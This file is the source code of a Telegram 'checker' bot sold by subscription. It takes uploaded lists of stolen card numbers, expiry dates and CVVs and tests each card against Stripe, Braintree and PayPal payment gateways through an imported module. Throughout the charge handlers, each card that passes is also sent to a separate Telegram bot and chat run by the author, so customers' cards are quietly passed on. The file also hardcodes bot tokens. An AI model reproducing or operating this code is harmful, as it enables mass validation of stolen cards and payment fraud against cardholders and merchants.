import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
stopuser = {}
token = '7256336819:AAHNVhk9skYegQfVYITW53skVpGoLEQbxWg'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin=1218380390
f = Faker()
name = f.name()
street = f.address()
city = f.city()
state = f.state()
postal = f.zipcode()
phone = f.phone_number()
coun = f.country()
mail = f.email()
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			ahmedhusien = types.InlineKeyboardMarkup(row_width=1)
			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
			keyboard.add(contact_button, ahmed)
			video_url = f'https://t.me/ahmed_hussien_01/2'
			bot.send_video(chat_id=message.chat.id, video=video_url, caption=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		video_url = f'https://t.me/ahmed_hussien_01/2'
		bot.send_video(chat_id=message.chat.id, video=video_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗛𝗘𝗦𝗘 𝗔𝗥𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 
━━━━━━━━━━━━
Gateway 🔥  [ Braintree Auth 1 ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ✅ ]
Format: /chk cc|mon|year|cvv
━━━━━━━━━━━━
Gateway 🔥  [ 3DS Lookup ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ❌ ]
Format: /vbv cc|mon|year|cvv
━━━━━━━━━━━━
Gateway 🔥  [ Stripe Charge ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ✅ ]
Format: /str cc|mon|year|cvv
━━━━━━━━━━━━
Gateway 🔥  [ Stripe Auth 1 ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ✅ ]
Format: /au  cc|mon|year|cvv
━━━━━━━━━━━━
Gateway 🔥  [ Braintree Auth 2 ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ❌ ]
Format: /cc cc|mon|year|cvv

━━━━━━━━━━━━
Gateway 🔥  [ PayPal 1$ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ❌ ]
Format: /pp cc|mon|year|cvv

━━━━━━━━━━━━
Gateway 🔥  [ Stripe Charge 2 ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ✅ ]
Format: /chr cc|mon|year|cvv

━━━━━━━━━━━━
Gateway 🔥  [ Braintree Charge ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ❌ ]
Format: /bch cc|mon|year|cvv

━━━━━━━━━━━━
Gateway 🔥  [ Stripe 1$ ♻️ ]
- - - - - - - - - - - - - - - - - - - - -
STATUS [ ONLINE ✅ ]
Format: /sp cc|mon|year|cvv

━━━━━━━━━━━━

𝗪𝗘 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗔𝗗𝗗𝗜𝗡𝗚 𝗦𝗢𝗠𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬𝗦 𝗔𝗡𝗗 𝗧𝗢𝗢𝗟𝗦 𝗦𝗢𝗢𝗡</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
			ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"♻️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 🏴‍☠️",callback_data='br')
		brcha = types.InlineKeyboardButton(text=f"♻️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 🏴‍☠️",callback_data='looll')
		charge = types.InlineKeyboardButton(text=f"🏴‍☠️ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 2 🪽",callback_data='bon')
		brii = types.InlineKeyboardButton(text=f" 🏴‍☠️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 2 ♻️",callback_data='br2')
		paypp = types.InlineKeyboardButton(text=f" 𝐏𝐚𝐲𝐩𝐚𝐥 $𝟏 🏴‍☠️",callback_data='payp')
		strii = types.InlineKeyboardButton(text=f" 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 ",callback_data='sta')
		schhhk = types.InlineKeyboardButton(text=f"🪽 𝗦𝗧𝗥𝗜𝗣𝗘 1$ ",callback_data='spe')
		sw = types.InlineKeyboardButton(text=f" 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 🪽",callback_data='str')
		keyboard.add(contact_button)
		keyboard.add(brii)
		keyboard.add(brcha)
		keyboard.add(paypp)
		keyboard.add(strii)
		keyboard.add(schhhk)
		keyboard.add(sw)
		keyboard.add(charge)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'str')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='stripe charge'
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					except:
						pass
					try:
					    level=(data['level'])
					except:
					    level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(st(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='live'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝑪𝑯𝑨𝑹𝑮𝑬 ✅ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Moha_Azouz''', reply_markup=mes)

					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ch += 1
						bot.send_message(call.from_user.id, msg)
					elif "funds" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif "card's security" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(5)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'looll')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 '
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					except:
						pass
					try:
					    level=(data['level'])
					except:
					    level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(brch(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='live'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝑪𝑯𝑨𝑹𝑮𝑬 ✅ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Moha_Azouz''', reply_markup=mes)

					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
